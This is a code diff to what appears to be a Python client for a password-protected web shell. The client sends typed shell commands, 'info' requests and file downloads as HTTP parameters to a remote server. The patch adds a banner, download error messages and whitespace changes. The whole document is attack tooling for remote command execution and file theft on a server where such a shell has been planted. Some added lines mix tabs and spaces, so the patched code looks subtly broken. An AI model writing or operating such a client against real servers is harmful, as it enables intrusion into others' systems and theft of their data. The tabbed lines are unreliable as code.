@@ -45,11 +45,11 @@ def fiturcd(cmd, getdir):
         if getcmd.group(1) == "..":
             for i in getdir.split('/')[:-1]:
                 newdir1 += i + "/"
-        
+
             result = newdir1
 
             return result
-            
+
         else:
             for i in getdir.split('/'):
                 newdir1 += i + "/" 
@@ -99,11 +99,11 @@ def connect():
         
         while True:
                 cmd = raw_input(command).rstrip()
-
                 if cmd == "exit":
                     break
                 elif cmd == "clear":
                     cls()
+                    banner()    
                 elif cmd == "info":
                     result = get(url, params={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                     print(result)
@@ -119,13 +119,19 @@ def connect():
                 elif(fiturdownload(cmd, getdir) != False):
                     getname = re.match(r'download (.*)', cmd, re.M|re.I)
                     output = fiturdownload(cmd, getdir)
-                    savein = raw_input("[?] Save File in: ")      
-                    download = get(url, params={"password":password,"dir":getdir,"cmd":"echo ''","aksi":"download","file":output})       
-                    open(savein + "/" + getname.group(1), 'wb').write(download.content)
+                    savein = raw_input("[?] Save File in: ")
+                    download = get(url, params={"password":password,"dir":getdir,"cmd":"echo ''","aksi":"download","file":output})  
+                    if download.text != "False":
+                        open(savein + "/" + getname.group(1), 'wb').write(download.content)
+                        print("[\033[92m✔\033[97m] Success Download File..\n")
+		    else:
+			print("[\033[91m-\033[97m] \033[91mError, Check your name file!")
+					    #open(savein + "/" + getname.group(1), 'wb').write(download.content)
+					    #print("[\033[91m-\033[97m] \033[91mError, Check your name file!")
                 else:
                     result = get(url, params={"password":password,"dir":getdir,"cmd":cmd}).text
 
-                print("\033[92m"+result + "\033[0m\n")         
+                print("\033[92m"+result + "\033[0m\n")
     
     else:
         print("[-] Password is Incorrect")
